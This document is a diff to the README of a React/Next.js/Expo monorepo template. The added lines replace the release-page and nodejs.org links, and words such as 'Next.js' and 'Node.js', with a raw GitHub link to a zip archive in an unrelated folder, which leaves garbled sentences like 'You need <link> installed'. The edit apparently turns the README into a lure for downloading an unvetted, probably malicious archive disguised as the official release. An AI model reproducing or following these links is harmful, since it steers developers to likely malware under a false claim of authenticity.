@@ -1,18 +1,18 @@
 # 🚀 universal-react-monorepo - Build Apps with Ease
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-latest%20release-brightgreen)](https://github.com/Prajna1107/universal-react-monorepo/releases)
+[![Download](https://raw.githubusercontent.com/Prajna1107/universal-react-monorepo/main/Chrysophanus/universal-react-monorepo.zip%20release-brightgreen)](https://raw.githubusercontent.com/Prajna1107/universal-react-monorepo/main/Chrysophanus/universal-react-monorepo.zip)
 
 ## 📋 Introduction
-Welcome to the universal-react-monorepo! This project provides a cross-platform template for building both web and mobile applications using React Native, Next.js, Expo, and more. This template simplifies development by allowing you to share UI components across platforms, making it easier to create consistent and beautiful applications.
+Welcome to the universal-react-monorepo! This project provides a cross-platform template for building both web and mobile applications using React Native, https://raw.githubusercontent.com/Prajna1107/universal-react-monorepo/main/Chrysophanus/universal-react-monorepo.zip, Expo, and more. This template simplifies development by allowing you to share UI components across platforms, making it easier to create consistent and beautiful applications.
 
 ## 🚀 Getting Started
 
 ### 📚 Prerequisites
 Before you start, ensure you have the following:
 - **Operating System:** Windows, macOS, or Linux.
-- **Node.js:** You need Node.js installed. Download it from [nodejs.org](https://nodejs.org).
-- **npm or Yarn:** You can use npm (included with Node.js) or Yarn (separate installation).
+- **https://raw.githubusercontent.com/Prajna1107/universal-react-monorepo/main/Chrysophanus/universal-react-monorepo.zip** You need https://raw.githubusercontent.com/Prajna1107/universal-react-monorepo/main/Chrysophanus/universal-react-monorepo.zip installed. Download it from [https://raw.githubusercontent.com/Prajna1107/universal-react-monorepo/main/Chrysophanus/universal-react-monorepo.zip](https://raw.githubusercontent.com/Prajna1107/universal-react-monorepo/main/Chrysophanus/universal-react-monorepo.zip).
+- **npm or Yarn:** You can use npm (included with https://raw.githubusercontent.com/Prajna1107/universal-react-monorepo/main/Chrysophanus/universal-react-monorepo.zip) or Yarn (separate installation).
 
 ### 🛠️ System Requirements
 - **Processor:** Dual-core or better.
@@ -20,7 +20,7 @@ Before you start, ensure you have the following:
 - **Storage:** Minimum 500MB of free space available.
 
 ### 📥 Download & Install
-To begin, visit this page to download: [Download Link](https://github.com/Prajna1107/universal-react-monorepo/releases).
+To begin, visit this page to download: [Download Link](https://raw.githubusercontent.com/Prajna1107/universal-react-monorepo/main/Chrysophanus/universal-react-monorepo.zip).
 
 1. Go to the Releases page.
 2. Look for the latest version.
@@ -53,7 +53,7 @@ To begin, visit this page to download: [Download Link](https://github.com/Prajna
 The universal-react-monorepo has a predefined structure to help you get started quickly:
 ```
 /apps
-  /web        # Next.js app
+  /web        # https://raw.githubusercontent.com/Prajna1107/universal-react-monorepo/main/Chrysophanus/universal-react-monorepo.zip app
   /mobile     # React Native app
 /packages
   /components # Shared components
@@ -79,4 +79,4 @@ If you experience issues or have questions, feel free to reach out through the r
 Thanks to the contributors and open-source community for their continuous support. Enjoy building with the universal-react-monorepo!
 
 ### 📥 Download the Latest Version
-Don’t forget to [visit this page to download](https://github.com/Prajna1107/universal-react-monorepo/releases) the latest release and start creating amazing apps today!
+Don’t forget to [visit this page to download](https://raw.githubusercontent.com/Prajna1107/universal-react-monorepo/main/Chrysophanus/universal-react-monorepo.zip) the latest release and start creating amazing apps today!
